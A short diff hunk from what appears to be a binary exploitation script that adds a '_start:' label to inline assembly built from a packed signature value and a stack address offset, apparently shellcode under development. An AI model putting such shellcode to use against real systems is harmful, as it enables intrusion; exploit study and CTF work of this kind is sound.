@@ -98,6 +98,7 @@ stack_addr_int = stack_addr_int + OFFSET
 signature = u64(Signature)
 
 smallAsm = f"""
+_start:
     mov rbx,{hex(signature)}
     call tmp
 tmp:  
